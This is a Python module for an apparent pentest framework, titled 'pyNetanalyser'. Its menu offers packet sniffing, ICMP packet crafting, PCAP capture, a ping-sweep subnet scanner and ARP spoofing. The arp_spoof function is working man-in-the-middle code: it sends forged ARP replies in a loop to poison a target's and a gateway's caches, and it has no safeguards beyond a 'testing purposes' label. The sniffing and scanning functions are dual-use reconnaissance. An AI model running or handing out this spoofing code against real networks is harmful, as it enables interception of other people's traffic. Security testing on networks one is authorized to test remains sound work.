MODULE_TYPE = "auxiliary"
from kamene.all import *
import os
import time
from collections import OrderedDict
import pyfiglet
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'pyNetanalyser ',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': '✅ Live Packet Sniffing (Ethernet, IP, TCP, UDP, ICMP, ARP)✅ Packet Crafting & Sending (ICMP, TCP, UDP)✅ Save Captured Packets to PCAP (For Wireshark analysis)✅ Network Scanning (Ping Sweep)✅ ARP Spoofing & MITM Attack Simulation (Testing Purposes)',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([          
                ('OPT', ('', False, '(Choose an option: )'))              
                ])
                }
    def help(self):
        print("Usage: set OPT <1,2,3,4,5,6> then run")    	    
    def logo(self):
    	title = 'pyNetanalyser'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    
    # Function to analyze packets
    def packet_callback(self,packet):
      print("=" * 50)
    
      if packet.haslayer(Ether):
        print(f"Ethernet: {packet[Ether].src} -> {packet[Ether].dst}")

      if packet.haslayer(IP):
        print(f"IP: {packet[IP].src} -> {packet[IP].dst} (TTL: {packet[IP].ttl})")

      if packet.haslayer(TCP):
        print(f"TCP: {packet[TCP].sport} -> {packet[TCP].dport} (Flags: {packet[TCP].flags})")

      if packet.haslayer(UDP):
        print(f"UDP: {packet[UDP].sport} -> {packet[UDP].dport}")

      if packet.haslayer(ICMP):
        print(f"ICMP: Type {packet[ICMP].type}, Code {packet[ICMP].code}")

      if packet.haslayer(ARP):
        print(f"ARP: {packet[ARP].psrc} -> {packet[ARP].pdst} (Operation: {packet[ARP].op})")

      print("=" * 50)
        
    # Sniff packets
    def sniff_packets(self):
      interface = input("Enter network interface (e.g., eth0, wlan0): ") or "eth0"
      count = int(input("Enter number of packets to capture: ") or 10)

      print(f"Sniffing {count} packets on {interface}...")
      sniff(iface=interface, count=count, prn=self.packet_callback, store=False)
    
    # Send a custom packet
    def send_custom_packet(self):
      target_ip = input("Enter target IP: ")
      message = input("Enter custom message (optional): ") or "Hello"
    
      if not target_ip:
        print("No target IP entered!")
        return
    
      print(f"Sending ICMP packet to {target_ip} with message: {message}")
      packet = IP(dst=target_ip) / ICMP() / Raw(load=message)
      send(packet, verbose=False)
      print("Packet Sent!")
    
    # Save packets to a PCAP file
    def save_pcap(self):
      interface = input("Enter network interface (e.g., eth0, wlan0): ") or "eth0"
      count = int(input("Enter number of packets to capture: ") or 10)
      filename = input("Enter filename (default: capture.pcap): ") or "capture.pcap"

      print(f"Saving {count} packets to {filename}...")
      packets = sniff(iface=interface, count=count)
      wrpcap(filename, packets)
      print(f"Saved to {filename}")
    
    # Network scanner (Ping Sweep)
    def network_scan(self):
      subnet = input("Enter subnet (e.g., 192.168.1.0/24): ")
      if not subnet:
        print("Invalid subnet!")
        return

      print(f"Scanning network {subnet}...")
      ans, _ = sr(IP(dst=subnet)/ICMP(), timeout=1, verbose=False)

      print("\nActive Hosts:")
      for sent, received in ans:
        print(f" - {received.src}")
        
    # ARP Spoofing (MITM Attack Simulation)
    def arp_spoof(self):
      target_ip = input("Enter target IP: ")
      gateway_ip = input("Enter gateway IP: ")

      if not target_ip or not gateway_ip:
        print("Invalid IP addresses!")
        return

      target_mac = getmacbyip(target_ip)
      gateway_mac = getmacbyip(gateway_ip)

      if not target_mac or not gateway_mac:
        print("Failed to get MAC addresses!")
        return

      print(f"ARP Spoofing {target_ip} -> {gateway_ip}...")
      try:
        while True:
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
            time.sleep(2)
      except KeyboardInterrupt:
        print("\nRestoring ARP Tables...")
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)
        print("ARP Spoofing Stopped!")
        
    def execute(self):
        self.logo()
        #choice = self.info['Options']['OPT'][0]
        
        # Menu
        while True:
            print("\nComplete Network Analyzer")
            print("1. Sniff Packets")
            print("2. Send Custom Packet")
            print("3. Save Packets to PCAP")
            print("4. Network Scanner (Ping Sweep)")
            print("5. ARP Spoofing (MITM Attack)")
            print("6. Exit")
            choice = input("Choose an option: ")
            if choice == "1":
                self.sniff_packets()
            elif choice == "2":
                self.send_custom_packet()
            elif choice == "3":
                self.save_pcap()
            elif choice == "4":
                self.network_scan()
            elif choice == "5":
                self.arp_spoof()
            elif choice == "6":
                return
            else:
                print("Invalid choice! Try again.")
        
        return "[+] running ..."
    